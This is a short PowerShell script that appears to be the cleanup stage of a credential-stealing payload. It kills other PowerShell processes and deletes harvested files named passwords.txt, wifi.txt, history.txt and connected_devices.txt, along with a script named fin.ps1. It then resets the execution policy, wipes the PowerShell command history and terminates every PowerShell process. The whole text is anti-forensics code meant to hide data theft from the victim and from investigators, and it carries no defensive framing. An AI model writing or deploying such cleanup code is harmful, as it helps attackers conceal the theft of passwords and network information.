Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one is running
Set-Location C:\Users\Public\Documents #Go to public documents location
#Delete information file
Remove-Item passwords.txt
Remove-Item history.txt
Remove-Item wifi.txt
Remove-Item connected_devices.txt
Remove-Item fin.ps1
Set-ExecutionPolicy restricted -Force #Reset script blocker
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
